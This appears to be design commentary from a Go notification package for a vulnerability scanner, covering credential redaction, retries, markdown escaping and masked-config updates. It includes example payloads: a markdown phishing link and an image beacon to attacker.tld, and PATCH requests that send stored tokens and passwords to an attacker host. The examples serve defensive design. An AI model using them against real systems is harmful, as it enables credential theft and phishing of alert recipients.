column2: IM notifications connect directly. Use a 15-second timeout; a slower peer is effectively failing.
Reject cross-host redirects: delivery URLs are fixed endpoints and normally do not
redirect to another host. Provider credentials (DingTalk access_token, WeCom key, Telegram
bot token) are **in the URL**, so following cross-host redirects hands them to the destination. Same-host
redirects, such as adding a trailing slash, remain allowed.
respBodyLimit bounds response-body reads. A malfunctioning peer may return huge content; we need only
an error code and a short description for delivery history.
doJSON sends one request and returns the bounded response body.
A nil payload sends an empty body (for GET or platforms requiring no body).
headers are appended unchanged for generic Webhook custom headers.
Error classification is central: network failures and 5xx/408/429 are retryable;
other 4xx are permanent. Retrying a 403 merely logs the same error three times.
Serialization failure is a local bug (incorrect configuration field type); retries cannot repair it.
An invalid URL is usually a user input mistake and is a permanent failure.
Again, do not pass err through: url.Parse errors include the complete URL.
Connection refusal, DNS failure, and timeouts are usually transient; retry with backoff.
Redact error text before exposing it. http.Client.Do returns *url.Error,
whose Error() is `Op "complete URL": underlying error`; provider credentials are **in the URL**
(DingTalk access_token, WeCom key, Feishu hook id, Telegram /bot<token>/).
Without redaction, credentials flow to four places: notification_deliveries
last_error (plaintext storage), delivery-history responses (**bypassing channel configuration masking**),
server logs, and the test-send endpoint's 502 text returned to the frontend.
429 (rate limiting) and 408 (timeout) merit retries; other 4xx indicate configuration or permission errors.
snippet compresses a response body to a short single line for error messages. Responses may contain newlines and whitespace;
putting them directly in last_error would break delivery-history layout.
redactRequestTarget reduces delivery URLs to "scheme://host/…" for error messages.
This is the package's sole URL-redaction policy, deliberately **coarse**: retain only scheme and host,
discard everything else. There is no universal safe way to identify which URL component is a credential:
DingTalk credentials in query      /robot/send?access_token=xxx
WeCom credentials in query         /cgi-bin/webhook/send?key=xxx
Feishu credentials in **last path segment** /open-apis/bot/v2/hook/<hook_id>
Telegram credentials in **middle path segment** /bot<token>/sendMessage
Keeping only useful parts would require channel-specific patches; missing any provider would leak credentials.
The host suffices for troubleshooting DNS, connection, and certificate problems;
identify the specific bot using the masked suffix in channel configuration.
Return a fixed placeholder on parse failure; never echo the original string.
redactTransportError removes URLs from transport errors, preserving only the underlying cause.
*url.Error has {Op, URL, Err}; its Error() prints the URL too.
Explicitly extract Err to bypass Error(), which is more reliable than subsequent string replacement:
replacement must handle all URL-encoded and escaped variants and can miss some.
Non-*url.Error values (such as redirect-policy errors) may also contain URLs; redact them consistently.
redactURLsInText replaces http(s) URLs in text with redacted forms.
This is a fallback for errors without structured fields (redirect-policy errors and custom third-party errors).
Recognize only http/https prefixes; split at whitespace and quotes, which cannot occur in URLs.
Shared message rendering for Markdown-based channels (DingTalk and WeCom).
Feishu uses card JSON; Telegram and email use HTML, rendered in their adapters.
maxAssetsShown limits displayed assets. A vulnerability can anchor dozens of assets;
listing all would overflow the message without adding value. Few readers inspect domains beyond the fourth in IM.
maxSummaryRunes limits summary length. IM messages prompt readers to view details;
they are not the report itself. Full content lives on the platform.
markdownReservedBytes reserves room for the header (batch summary, severity distribution, and possible truncation notice)
and footer (platform link). Deduct this from the whole-item packing budget to prevent truncation of either;
otherwise readers cannot identify the batch or how many items are missing.
markdownEscape escapes markdown metacharacters.
Why this is necessary: vulnerability title, summary, class, and asset display name all come from **untrusted sources**.
Titles and summaries come from model output informed by target responses; asset URLs are full scanned
URLs, including target-controlled query strings. Without escaping, a title such as
Login SQL injection\n[Urgent: verify your account here](http://attacker.tld)
would render as a **clickable external link** in the security engineer's DingTalk/Feishu client;
`![](http://attacker.tld/beacon)` is fetched by the client during rendering, indicating
that the vulnerability was viewed and exposing the reader's IP. Even benign injected bold text or
blockquotes can push serious vulnerabilities below the fold.
The escape set covers headings, links, emphasis, lists, blockquotes, and strikethrough: characters that change structure or create clickable
elements. Process `\` first to avoid escaping newly inserted backslashes again.
markdownText compresses untrusted text to one line and escapes it for markdown bodies.
Single-line conversion complements escaping: newlines alone can forge list items or blockquotes,
which character escaping cannot stop.
markdownTitle returns the message title (IM title bar/card title) as **unescaped original text**.
Deliberately do not escape here: this title is shared across rendering contexts: markdown bodies, Telegram
HTML, Feishu card plain_text, generic Webhook JSON, and email subjects. Each context has
different escaping rules (markdown escapes leave visible backslashes in HTML and contaminate JSON
data), so each output sink must perform its own escaping; see writeItem / feishuItemLines /
telegramEscape. Previously adding markdown escaping in the shared function caused Telegram messages
to show literal backslashes such as `\(1\)`.
markdownBody renders the message body and returns it with **the number of items actually included**.
kept counts items actually delivered. Callers mark only the first kept entries
delivered; entries excluded by channel limits must remain for the next batch, not be
marked successful. Otherwise truncation causes silent loss: delivery records claim all items succeeded,
with no indication that the latter part was never sent.
maxBytes<=0 means unlimited.
Send even an oversized single item, with final truncation as fallback: partial vulnerability information
is better than no notification.
markdownBatchIntro renders the batch introduction: time window, item count, and severity distribution.
This lets recipients decide whether immediate action is needed without opening the platform.
items are **actually included** entries; total is the intended batch size. If they differ, explicitly state
how many continue in the next message; otherwise readers assume the header count covers everything,
while unsent items are entirely absent from the interface.
Show severity distribution so readers can spot serious entries. Count only entries **actually included**
in this message so the critical count matches the entries visible below.
writeItem renders one vulnerability entry.
prefix is the batch sequence number; single=true renders full details (summary and backlink).
Batch lists show a one-line summary, or a 50-item batch would become a long document.
All external content (title/class/assets/summary) passes through markdownText:
single-line conversion plus escaping. The backlink comes from administrator-configured public_base_url, not untrusted content,
and must remain clickable, so output it unchanged.
Batch mode: one line with compressed assets and summary appended.
MaskedPrefix marks masked values. API responses replace credentials with values carrying this prefix;
update requests interpret such values as keeping the stored value unchanged.
A prefix, rather than an empty string or fixed constant, also allows some identifying information
(see MaskedValue), letting users recognize the bot without repasting its key.
MaskedValue generates a masked value:
__masked__              Original too short; provide no hint.
__masked__:…ab12cd      Include the last 6 characters as an identifying hint.
Exposing only the final 6 characters is deliberate: Webhook identifiers occur near the end (WeCom key,
Feishu bot id), whereas prefixes are shared and unhelpful. Six characters cannot reconstruct
the credential but suffice for the configurator to recognize the group.
IsMasked reports whether a value is masked (returned by the API and left unchanged).
MaskConfig copies configuration, replacing channel credential fields with masked values.
Unknown channel types return an empty map, not the original configuration; prefer an unavailable configuration UI
o exposing raw content that may contain credentials when the channel type is unrecognized.
Preserve noncredential fields unchanged so the UI can display them.
Treat nested structures such as headers as one credential: inspecting subkeys would require each channel
to declare another set of credential-subkey rules, with complexity exceeding the benefit.
ErrDestinationChangedWithoutCredentials means the destination changed without explicit input for
credential fields. Return it rather than silently allowing the change or dropping credentials; see PrepareConfigUpdate.
PrepareConfigUpdate merges channel configuration and handles security-sensitive destination changes.
It replaces bare MergeConfig in channel updates to block this verified attack path:
destination and credentials are independent fields, while MergeConfig preserves stored values
for omitted keys. Anyone able to PATCH a channel could **change only the destination,
omitting credentials**, causing the server to send stored credentials to an attacker-controlled endpoint:
webhook  {config:{url:"https://attacker.tld"}}  -> original Authorization header sent externally
telegram {config:{base_url:"https://attacker.tld"}} -> /bot<realToken>/sendMessage
email    {config:{host:"smtp.attacker.tld"}}    -> username and password sent after STARTTLS
This is entirely silent and needs no redirect, so denying cross-host redirects does not stop it;
it directly defeats masking's goal of never returning credentials to the browser.
Rule: whenever a destination key changes, callers must explicitly address **every** credential key:
- Supply a new value -> use it.
- Explicitly supply an empty string -> no credential needed for this field (preserve clearing semantics).
- Return the masked value unchanged or omit the key -> reject.
The third case is rejected because a masked value means reusing the old credential, which
belongs only to the old destination. Deliberately do not automatically discard credentials: optional fields
(webhook headers, email password) would silently lose authentication while returning 200,
making diagnosis harder than an error. Prefer requiring explicit re-entry.
A masked literal inside a nonstring credential value (such as a webhook headers object)
means the caller embedded a keep-original sentinel inside a structure. MergeConfig recognizes only strings
with the prefix as masked; this would be stored as an ordinary object, persisting literal
__masked__ and silently breaking subsequent authentication. Reject it instead.
This check must come **first**: an unchanged destination returns early, so placing it later
covers only destination changes (the initial version made this mistake, caught by tests).
Find genuinely changed destination keys. Masked values mean unchanged.
Unchanged destination: normal merge (masked preserves, empty clears, otherwise overwrite).
Changed destination: require explicit input for every credential key.
rejectMaskedInContainers rejects masked sentinels embedded in nonstring structures.
Masking assumes the **entire value is a string**. Object fields such as webhook headers
must be masked as a whole (the string "__masked__") or submitted as a whole; embedded sentinels
cannot express keeping values unchanged and would be stored as real values.
sameConfigValue compares configuration values for equivalence. JSON serialization also handles
type differences: frontend ports are numbers and stored ports are float64; direct == could misclassify them.
Normalize blank values first: an empty string and a missing key represent the same state here,
because MergeConfig explicitly clears an empty string by deleting its key. Without normalization, an
optional destination field left blank (Telegram base_url is the only one; blank uses the
official URL) follows this sequence:
Creation stores base_url:"" -> first save removes the key through MergeConfig.
-> Second save: incoming is "", stored lacks the key; classified as a destination change.
-> Credentials are masked -> 400 requiring credentials to be re-entered with the changed destination.
Every subsequent save fails unless the user repastes the Bot Token, despite changing nothing.
isBlankConfigValue reports whether a configuration value is blank.
Its definition must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
or MergeConfig may consider a value removable while sameConfigValue considers it present.
MergeConfig merges incoming over stored to update channel configuration.
Rules:
- Masked incoming value -> preserve stored value (the user did not edit this field).
- Empty incoming string -> explicit clearing; delete the key.
- Other keys -> overwrite with incoming values.
- Keys present only in stored -> preserve (partial-update semantics).
Whether an empty string clears must be explicit: frontend forms submit blank fields as empty strings;
storing those as real values would clear fields intended to retain their existing values.
Choose explicit clearing because users have no other way to remove a misconfigured field
(omitting a field distinguishes absent from explicitly empty, but the UI does not use that distinction).
